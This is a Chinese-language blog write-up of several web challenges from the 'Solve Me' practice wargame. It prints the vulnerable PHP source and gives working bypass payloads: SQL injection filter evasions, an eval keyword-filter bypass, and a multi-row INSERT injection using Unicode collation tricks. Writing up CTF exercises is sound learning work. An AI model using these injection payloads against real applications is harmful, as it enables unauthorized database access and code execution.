<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    // It&apos;s &apos;Anti SQLi&apos; problem of &apos;Solve Me&apos;.</div><div class="line">    error_reporting(0);</div><div class="line">    require __DIR__.&apos;/lib.php&apos;; </div><div class="line"></div><div class="line">    $id = $_GET[&apos;id&apos;];</div><div class="line">    $pw = $_GET[&apos;pw&apos;];</div><div class="line"></div><div class="line">    if(isset($id, $pw))&#123;</div><div class="line">        preg_match(</div><div class="line">            &apos;/\.|\`|&quot;|\&apos;|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|&apos;.</div><div class="line">            &apos;=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|&apos;.</div><div class="line">            &apos;0x[0-9a-f]+|0b[01]+|x\&apos;[0-9a-f]+\&apos;|b\&apos;[01]+\&apos;|&apos;.</div><div class="line">            &apos;[\s\xA0\&apos;&quot;]+(as|or|and|r*like|regexp)[\s\xA0\&apos;&quot;]+|&apos;.</div><div class="line">            &apos;union[\s\xA0]+select|[\s\xA0](where|having)|&apos;.</div><div class="line">            &apos;[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|&apos;.</div><div class="line">            &apos;information_schema|procedure\s+analyse\s*/is&apos;,</div><div class="line">            $id.&apos;,&apos;.$pw</div><div class="line">        ) and die(&apos;Hack detected&apos;);</div><div class="line"></div><div class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</div><div class="line">            or die(&apos;SQL server down&apos;);</div><div class="line"></div><div class="line">        $result = mysqli_fetch_array(</div><div class="line">            mysqli_query(</div><div class="line">                $con, </div><div class="line">                &quot;SELECT * FROM `antisqli` WHERE `id`=&apos;&#123;$id&#125;&apos; AND `pw`=md5(&apos;&#123;$pw&#125;&apos;);&quot;</div><div class="line">            )</div><div class="line">        );</div><div class="line">        mysqli_close($con);</div><div class="line"></div><div class="line">        if(isset($result))&#123;</div><div class="line">            if($result[&apos;no&apos;] === &apos;31337&apos;)&#123;</div><div class="line">                echo $flag;</div><div class="line">            &#125;else&#123;</div><div class="line">                echo &apos;Hello, &apos;, $result[&apos;id&apos;];</div><div class="line">            &#125;</div><div class="line">        &#125;else&#123;</div><div class="line">            echo &apos;Login failed&apos;;</div><div class="line">        &#125;</div><div class="line">        echo &apos;&lt;hr&gt;&apos;;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure>
<p>第一反应union-》union select被过滤-》用union all select 绕过</p>
<p>单引号被过滤-》没法闭合-》注释符#和–加任意字符也被过滤-》用–%1a注释</p>
<p>用正则过滤反斜杠正确姿势是四个反斜杠(第一个斜杠转义了第二个，第三个转义了第四个，最终就是 “\”，正则表达式里转互相转义一下就是 “\”了)-》可以用反斜杠转义掉$id后面的单引号-》</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM `antisqli` WHERE `id`=&apos;\&apos; AND `pw`=md5(&apos;&#123;$pw&#125;&apos;);</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\&apos; AND `pw`=md5( //这一整个变成字符串里的了</div></pre></td></tr></table></figure>
<p>最后试出三列</p>
<p><code>id=\&amp;pw=union all select 31337,31337,31337 from antisqli --%1a</code></p>
<h3 id="Namecheck"><a href="#Namecheck" class="headerlink" title="Namecheck"></a>Namecheck</h3><p>What’s your name?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    error_reporting(0);</div><div class="line">    require __DIR__.&apos;/lib.php&apos;; </div><div class="line"></div><div class="line">    if(isset($_GET[&apos;name&apos;]))&#123;</div><div class="line"></div><div class="line">        $name = $_GET[&apos;name&apos;];</div><div class="line">        if(preg_match(&quot;/admin|--|;|\(\)|\/\*|\\0/i&quot;, $name))&#123;</div><div class="line">            echo &apos;Not allowed input&apos;;</div><div class="line">            goto quit;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $sql = new SQLite3(&apos;name_check.db&apos;, SQLITE3_OPEN_READWRITE);</div><div class="line">        $res = $sql-&gt;query(&quot;</div><div class="line">            SELECT </div><div class="line">            MAX(&apos;0&apos;,&apos;1&apos;,&apos;&#123;$name&#125;&apos;) LIKE &apos;a%&apos;,        //以a开头</div><div class="line">            INSTR(&apos;&#123;$name&#125;&apos;,&apos;d&apos;)&gt;0,                  //包含d</div><div class="line">            MIN(&apos;&#123;$name&#125;&apos;,&apos;b&apos;,&apos;c&apos;) LIKE &apos;__m__&apos;,     //中间为m</div><div class="line">            SUBSTR(&apos;&#123;$name&#125;&apos;,-2)=&apos;in&apos;                //最后两个是in</div><div class="line">        ;&quot;);</div><div class="line">        if($res === false)&#123;</div><div class="line">            echo &apos;Database error&apos;;</div><div class="line">            goto quit;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $row = $res-&gt;fetchArray(SQLITE3_NUM);</div><div class="line">        if(</div><div class="line">            $row[0] + $row[1] + $row[2] + $row[3] !== 4 ||</div><div class="line">            array_sum($row) !== 4                    //四条都满足</div><div class="line">        )&#123;</div><div class="line">            echo &apos;Auth failed&apos;;</div><div class="line">            goto quit;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        echo $flag;</div><div class="line"></div><div class="line">    quit:</div><div class="line">        echo &apos;&lt;hr&gt;&apos;;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure>
<p>SQLite连接符：||</p>
<p>所以name=adm’||’in</p>
<h3 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h3><p>I am very slow because I often sleep.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    // It&apos;s &apos;I am slowly&apos; problem of &apos;Solve Me&apos;.</div><div class="line">    error_reporting(0);</div><div class="line">    require __DIR__.&apos;/lib.php&apos;; </div><div class="line"></div><div class="line">    $table = &apos;iamslowly_&apos;.ip2long($_SERVER[&apos;REMOTE_ADDR&apos;]);</div><div class="line">    $answer = $_GET[&apos;answer&apos;];</div><div class="line"></div><div class="line">    if(isset($answer))&#123;</div><div class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</div><div class="line">            or die(&apos;SQL server down&apos;);</div><div class="line"></div><div class="line">        $result = mysqli_fetch_array(</div><div class="line">            mysqli_query($con, &quot;SELECT `count` FROM `&#123;$table&#125;`;&quot;)</div><div class="line">        );</div><div class="line">        if(!isset($result))&#123;</div><div class="line">            mysqli_query($con, &quot;CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);&quot;);</div><div class="line">            $new_answer = md5(sha1(&apos;iamslowly_&apos;.mt_rand().&apos;_&apos;.mt_rand().&apos;_&apos;.mt_rand()));</div><div class="line">            mysqli_query($con, &quot;INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES (&apos;&#123;$new_answer&#125;&apos;,1);&quot;);</div><div class="line"></div><div class="line">        &#125;elseif($result[&apos;count&apos;] === &apos;12&apos;)&#123;</div><div class="line">            mysqli_query($con, &quot;DROP TABLE `&#123;$table&#125;`;&quot;);</div><div class="line">            echo &apos;Game over&apos;;</div><div class="line">            goto quit;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $randtime = mt_rand(1, 10);</div><div class="line">        $result = mysqli_fetch_array(</div><div class="line">            mysqli_query($con, &quot;SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`=&apos;&#123;$answer&#125;&apos;;&quot;)</div><div class="line">        );</div><div class="line">        if(isset($result) &amp;&amp; $result[&apos;answer&apos;] === $answer)&#123;</div><div class="line">            mysqli_query($con, &quot;DROP TABLE `&#123;$table&#125;`;&quot;);</div><div class="line">            echo $flag;</div><div class="line">        &#125;else&#123;</div><div class="line">            mysqli_query($con, &quot;UPDATE `&#123;$table&#125;` SET `count`=`count`+1;&quot;);</div><div class="line">            echo &apos;Go fast&apos;;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">quit:</div><div class="line">        mysqli_close($con);</div><div class="line">        echo &apos;&lt;hr&gt;&apos;;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure>
<p>很想po表情包。。fine，anyway，peace&amp;love（微笑。。。人间不值得啊。。</p>
<p>跑了一整天的脚本，，每次不一样也就算了，还每一次都错QAQ</p>
<p>思路就是在第十一次的时候让它睡久一点，第十二次判断了之后十一次才进行到加一就可以绕过count=12时drop表的判断了，有点条件竞争的意思</p>
<p>然后再在answer处时间盲注。。也只有这儿能注2333。。。然后。。坑</p>
<p>跑到最后它已经是aaaaaaaaaa了，，发个请求就回应几个字符，过了半天又多几个。。。难道站被日坏了吗。。</p>
<p>就酱。跑不粗就跑不粗呗。阿弥陀佛。人间不值得.jpg。</p>
<h3 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    error_reporting(0);</div><div class="line">    require __DIR__.&apos;/lib.php&apos;;</div><div class="line"></div><div class="line">    $exam = &apos;return\&apos;&apos;.sha1(time()).&apos;\&apos;;&apos;;</div><div class="line"></div><div class="line">    if (!isset($_GET[&apos;flag&apos;])) &#123;</div><div class="line">        echo &apos;&lt;a href=&quot;./?flag=&apos;.$exam.&apos;&quot;&gt;Click here&lt;/a&gt;&apos;;</div><div class="line">    &#125;</div><div class="line">    else if (strlen($_GET[&apos;flag&apos;]) != strlen($exam)) &#123;         //flag长度需要是49</div><div class="line">        echo &apos;Not allowed length&apos;;</div><div class="line">    &#125;</div><div class="line">    else if (preg_match(&apos;/`|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is&apos;, $_GET[&apos;flag&apos;])) &#123;</div><div class="line">        echo &apos;Not allowed keyword&apos;;</div><div class="line">    &#125;</div><div class="line">    else if (eval($_GET[&apos;flag&apos;]) === sha1($flag)) &#123;</div><div class="line">        echo $flag;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        echo &apos;What\&apos;s going on?&apos;;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    echo &apos;&lt;hr&gt;&apos;;</div><div class="line"></div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure>
<p>很简单的源码==大道至简啊</p>
<p>只要<code>eval($_GET[&#39;flag&#39;]) === sha1($flag)</code> 就可以得到flag~</p>
<p>先尝试构造 <code>?flag=$a=%27fl%27;$b=%27ag%27;return%20sha1(${$a.$b});1111111111;</code> ，才发现括号被过滤惹</p>
<p>那咋办咧，看一看eval函数</p>
<blockquote>
<p>eval() 返回 NULL，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。</p>
<p>代码不能包含打开/关闭 PHP tags。比如， ‘echo “Hi!”;’ 不能这样传入： ‘&lt;?php echo “Hi!”; ?&gt;’。但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 ‘echo “In PHP mode!”; ?&gt;In HTML mode!&lt;?php echo “Back in PHP mode!”;’。</p>
<p>除此之外，传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。比如 ‘echo “Hi!”‘ 会导致一个 parse error，而 ‘echo “Hi!”;’ 则会正常运行。</p>
<p>return 语句会立即中止当前字符串的执行。</p>
<p>代码执行的作用域是调用 eval() 处的作用域。因此，eval() 里任何的变量定义、修改，都会在函数结束后被保留。</p>
</blockquote>
<p>没办法等于，于是尝试用eval直接输出，然鹅输出的函数都过滤惹</p>
<p>想到<code>&lt;?php echo $a; ?&gt;</code> 有个简写版： <code>&lt;?=$a;?&gt;</code></p>
<p>于是构造 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">woc？？.也被过滤惹</div><div class="line"></div><div class="line">emmmm`?flag=$a=%27flaa%27;$a&#123;3&#125;=%27g%27;1111111111111111111?&gt;&lt;?=$$a?&gt;` 这样~</div><div class="line"></div><div class="line">！鸡冻</div><div class="line"></div><div class="line">### Cheap Lottery</div><div class="line"></div><div class="line">首先终于发现一个不是直接给源码的题，当然是玩一发啦~然而等60s真的是烦==（本来就不是让你玩的辣！</div><div class="line"></div><div class="line">发现三种不同的返回。。就没一次对惹一个的嘛！（满脸非气QAQ</div><div class="line"></div><div class="line">在robots.txt发现/backup/</div><div class="line"></div><div class="line">ini.sql:</div><div class="line"></div><div class="line">![CpDHD1.png](https://s1.ax1x.com/2018/04/03/CpDHD1.png)</div><div class="line"></div><div class="line">其中注意到ENGINE=InnoDB DEFAULT CHARSET=utf8;不叽到是不是故意强调的~</div><div class="line"></div><div class="line">index.php:</div></pre></td></tr></table></figure>
<p>&lt;?php<br>    require <strong>DIR</strong>.”/_config.php”;<br>    $sql = new mysqli($sql_host, $sql_username, $sql_password, $sql_dbname) or die(“SQL Server Down T.T”);</p>
<pre><code>$name = &quot;guest_&quot;.$_SERVER[&apos;REMOTE_ADDR&apos;];
$result = $sql-&gt;query(&quot;SELECT * FROM `lottery` WHERE `name`=&apos;{$name}&apos;;&quot;);
$row_guest = $result-&gt;fetch_assoc();
unset($name, $result);

if(isset($_GET[&apos;lottery&apos;]) &amp;&amp; is_array($_GET[&apos;lottery&apos;]) &amp;&amp; count($_GET[&apos;lottery&apos;]) == 5){ // buy request

    if(isset($row_guest)){ // already bought

        $msg = &quot;You already bought a lottery ticket at &quot;.date(&apos;Y-m-d H:i:s&apos;, $row_guest[&apos;time&apos;]).&quot;.&quot;;
        $buy_enable = false;

    }else{ // not bought yet, but buy now

        // insert real answer
        $name = &quot;admin_&quot;.$_SERVER[&apos;REMOTE_ADDR&apos;];
        $time = time();
        $nums = implode(&quot;,&quot;, [ mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100) ]);
        $sql-&gt;query(&quot;INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE(&apos;{$name}&apos;, &apos;{$time}&apos;, &apos;{$nums}&apos;);&quot;);
        unset($name, $time, $nums);

        // insert my answer
        $name = &quot;guest_&quot;.$_SERVER[&apos;REMOTE_ADDR&apos;];
        $time = time();

        $url_query = urldecode(parse_url($_SERVER[&apos;REQUEST_URI&apos;], PHP_URL_QUERY));
        $nums = preg_replace(&quot;/[a-zA-Z\[\]\=]/&quot;, &quot;&quot;, $url_query);
        $nums = strtr($nums, &quot;&amp;&quot;, &quot;,&quot;);
        $sql-&gt;query(&quot;INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE(&apos;{$name}&apos;, &apos;{$time}&apos;, &apos;{$nums}&apos;);&quot;);
        unset($name, $time, $url_query, $nums);

        $msg = &quot;You bought a lottery ticket. Please wait 60 sec.&quot;;
        $buy_enable = false;
    }

}else{ // not buy request

    if(isset($row_guest)){ // already bought

        if(intval($row_guest[&apos;time&apos;]) + 60 &lt;= time()){ // publish result

            $name = &quot;admin_&quot;.$_SERVER[&apos;REMOTE_ADDR&apos;];
            $result = $sql-&gt;query(&quot;SELECT * FROM `lottery` WHERE `name`=&apos;{$name}&apos;;&quot;);
            $row_admin = $result-&gt;fetch_assoc();
            unset($name, $result);

            // check answer
            $bingo = 0;
            $nums_admin = explode(&quot;,&quot;, $row_admin[&apos;nums&apos;]); // admin_*
            $nums_guest = explode(&quot;,&quot;, $row_guest[&apos;nums&apos;]); // guest_*
            for($i = 0; $i &lt; 5; ++$i){
                for($k = 0; $k &lt; 5; ++$k){
                    if(isset($nums_admin[$i], $nums_guest[$k]) &amp;&amp; $nums_admin[$i] === $nums_guest[$k]){
                        ++$bingo;
                        unset($nums_guest[$k]);
                        break;
                    }
                }
            }
            unset($nums_admin, $nums_guest);

            if($bingo == 5){ // correct all
                $msg = &quot;Perfect! The flag is &lt;code&gt;{$flag}&lt;/code&gt;.&quot;;

            }elseif($bingo &gt; 0){ // correct
                $msg = &quot;Excellent! You matched {$bingo} numbers. :)&quot;;

            }else{ // incorrect
                $msg = &quot;Oops! You did not even match one. :(&quot;;

            } 
            $buy_enable = true;

            $name_admin = &quot;admin_&quot;.$_SERVER[&apos;REMOTE_ADDR&apos;];
            $name_guest = &quot;guest_&quot;.$_SERVER[&apos;REMOTE_ADDR&apos;];
            $sql-&gt;query(&quot;DELETE FROM `lottery` WHERE `name` IN (&apos;{$name_admin}&apos;, &apos;{$name_guest}&apos;);&quot;);
            unset($name, $name_admin, $name_guest);

        }else{

            $msg = &quot;Please wait until at &quot;.date(&apos;Y-m-d H:i:s&apos;, intval($row_guest[&apos;time&apos;]) + 60).&quot;.&quot;;
            $buy_enable = false;
        }

    }else{ // not bought

        $msg = &quot;Oh, Please buy a lottery ticket. It&apos;s free!&quot;;
        $buy_enable = true;
    }
}
</code></pre><p>?&gt;<br>&lt;!DOCTYPE html&gt;</p>
<p><html lang="en"><br>    <head><br>        <meta charset="utf-8"><br>        <meta http-equiv="X-UA-Compatible" content="IE=edge"><br>        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><br>        <link rel="icon" href="/assets/coin.png"><br>        <title>Cheap Lottery</title><br>        <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"><br>        <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Josefin+Sans"><br>        <link rel="stylesheet" href="/assets/styles.css"><br>    </head><br>    <body><br>        <div class="container-fluid"><br>            <div class="row"><br>                <div class="col-md-offset-2 col-md-8"><br>                    <header class="page-header"><br>                        <h1><br>                            <p><a class="no-deco" href="/"><img src="/assets/coin.png" style="vertical-align: bottom;"> Cheap Lottery</a></p><br>                            <small>We’ll give you the flag, if you win a chance of 1 in 10,000,000,000!</small><br>                        </h1><br>                    </header><br>                </div><br>            </div><br>            <div class="row"><br>                <div class="col-md-offset-2 col-md-8"><br>                    <form method="GET"><br>&lt;?php<br>    for($k = 0; $k &lt; 5; ++$k){<br>        $title = [‘A’, ‘B’, ‘C’, ‘D’, ‘E’][$k];</form></div></div></div></body></html></p>
<pre><code>    echo &apos;&lt;div class=&quot;lottery-box&quot;&gt;&apos;.PHP_EOL;
    echo &apos;    &lt;h2&gt;&apos;.$title.&apos;&lt;/h2&gt;&apos;.PHP_EOL;
    for($i = 1; $i &lt;= 100; ++$i){
        echo &apos;    &lt;div class=&quot;radio-box&quot;&gt;&apos;.PHP_EOL;
        echo &apos;        &lt;label class=&quot;radio-inline&quot;&gt;&lt;input type=&quot;radio&quot; name=&quot;lottery[&apos;.$title.&apos;]&quot; value=&quot;&apos;.$i.&apos;&quot;&gt;&apos;.$i.&apos;&lt;/label&gt;&apos;.PHP_EOL;
        echo &apos;    &lt;/div&gt;&apos;.PHP_EOL;
    }
    echo &apos;&lt;/div&gt;&apos;.PHP_EOL;

    unset($title);
}
</code></pre><p>?&gt;<br>                        <div class="clearfix"></div><br>                        <div class="text-center" style="margin-top: 2.5em;"><br>                            <button type="submit" class="btn btn-success btn-lg" <?php="" if(!$buy_enable)="" echo="" "="" disabled";="" ?="">&gt;Buy Ticket</button><br>                        </div><br>                    <br>                <br>            <br>            <div class="row"><br>                <div class="col-md-offset-3 col-md-6"><br>                    <hr><br>                    <div class="well text-center"><br>                        &lt;?php echo $msg; ?&gt;<br>                    </div><br>                </div><br>            </div><br>            <div class="row"><br>                <div class="col-md-offset-2 col-md-8"><br>                    <hr><br>                    <footer class="text-right"><br>                        <p class="text-muted">&copy; <a class="text-muted" href="//safflower.kr" target="_blank">Safflower</a>. All Rights Reserved.</p><br>                    </footer><br>                </div><br>            </div><br>        <br>    <br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">数据库结构：</div><div class="line"></div><div class="line">name|time|nums</div><div class="line"></div><div class="line">admin_ip|time()|random_a,b,c,d,e</div><div class="line"></div><div class="line">guest_ip|time()|get_A,B,C,D,E</div><div class="line"></div><div class="line">index逻辑：</div><div class="line"></div><div class="line">![CpBkLt.png](https://s1.ax1x.com/2018/04/03/CpBkLt.png)</div><div class="line"></div><div class="line">看注入处过滤：</div></pre></td></tr></table></figure></p>
<p>$nums = preg_replace(“/[a-zA-Z[]=]/“, “”, $url_query);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">字母全不行，但是没过滤任何符号</div><div class="line"></div><div class="line">先看要怎么注：</div><div class="line"></div><div class="line">```INSERT INTO lottery(name, time, nums) VALUE(&apos;&#123;$name&#125;&apos;, &apos;&#123;$time&#125;&apos;, &apos;&#123;$nums&#125;&apos;);</div></pre></td></tr></table></figure></p>
<p>$nums是传入的</p>
<figure class="highlight plain"><figcaption><span>INTO lottery(name, time, nums) VALUE('&#123;$name&#125;', '&#123;$time&#125;', '1'),('admin_ip"','time()','1,1,1,1,1'),('guest_ip','time()','1,1,1,1,1')#');```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">这样使我们注入的IP再不带参数地访问时就可以匹配惹</div><div class="line"></div><div class="line">然后。这里面唯十个字母咋办呢。</div><div class="line"></div><div class="line">果断是找编码代替：无字母且SQL能识别</div><div class="line"></div><div class="line">悄咪咪看wp~有这样一个[神奇的网站][http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html]</div><div class="line"></div><div class="line">最后payload</div><div class="line"></div><div class="line">```http://cheaplottery.solveme.peng.kr/index.php?lottery%5BA%5D=1&apos;),(&apos;%C3%A0%C4%8F%E1%B9%81%C3%8D%C3%B1_192.34.62.236&apos;,&apos;1522763149&apos;,&apos;1,1,1,1,1&apos;),(&apos;%C4%9D%C3%9B%C3%A8%C5%9B%C5%A3_192.34.62.236&apos;,&apos;1522763149&apos;,&apos;1,1,1,1,1&apos;)%23&amp;lottery%5BB%5D=&amp;lottery%5BC%5D=&amp;lottery%5BD%5D=&amp;lottery%5BE%5D=</div></pre></td></tr></table></figure>
<p>url解码粗来是这样滴</p>
<p><code>http://cheaplottery.solveme.peng.kr/index.php?lottery[A]=1&#39;),(&#39;àďṁÍñ_192.34.62.236&#39;,&#39;1522763149&#39;,&#39;1,1,1,1,1&#39;),(&#39;ĝÛèśţ_192.34.62.236&#39;,&#39;1522763149&#39;,&#39;1,1,1,1,1&#39;)#&amp;lottery[B]=&amp;lottery[C]=&amp;lottery[D]=&amp;lottery[E]=</code></p>
<p>别忘惹它有传入数组的判断~所以五个都要传</p>
<p>至此这个可爱哒网站上的web就都ak啦~喜大普奔~完结撒花~~~</p>

        
    

    
</div>


                

                <!-- Post Comments -->
                
                    
                
            </div>

            <!-- Post Prev & Next Nav -->
            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
    <!-- Prev Nav -->
    
        <a href="/2018/03/21/bpzc/" id="post_nav-newer" class="prev-content">
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_back</i>
            </button>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            新篇
        </a>
    

    <!-- Section Spacer -->
    <div class="section-spacer"></div>

    <!-- Next Nav -->
    
        <a href="/2018/02/23/mdl/" id="post_nav-older" class="next-content">
            旧篇
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_forward</i>
            </button>
        </a>
    
</nav>

        </div>
    </div>



                    
                        <!-- Overlay For Active Sidebar -->
<div class="sidebar-overlay"></div>

<!-- Material sidebar -->
<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
    <div id="sidebar-main">
        <!-- Sidebar Header -->
        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
    <!-- Top bar -->
    <div class="top-bar"></div>

    <!-- Sidebar toggle button -->
    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
        <i class="material-icons">clear_all</i>
        <span class="mdl-button__ripple-container">
            <span class="mdl-ripple">
            </span>
        </span>
    </button>

    <!-- Sidebar Avatar -->
    <div class="sidebar-image">
        <img src="/img/2.jpg" alt="铃落's avatar">
    </div>

    <!-- Sidebar Email -->
    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
        ringfall3@gmail.com
        <b class="caret"></b>
    </a>
</div>


        <!-- Sidebar Navigation  -->
        <ul class="nav sidebar-nav">
    <!-- User dropdown  -->
    <li class="dropdown">
        <ul id="settings-dropdown" class="dropdown-menu">
            
                <li>
                    <a href="#" target="_blank" title="Email Me">
                        
                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
                        
                        Email Me
                    </a>
                </li>
            
        </ul>
    </li>

    <!-- Homepage -->
    
        <li id="sidebar-first-li">
            <a href="/">
                
                    <i class="material-icons sidebar-material-icons">home</i>
                
                主页
            </a>
        </li>
        
    

    <!-- Archives  -->
    
        <li class="dropdown">
            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                
                    <i class="material-icons sidebar-material-icons">inbox</i>
                
                    归档
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu">
            <li>
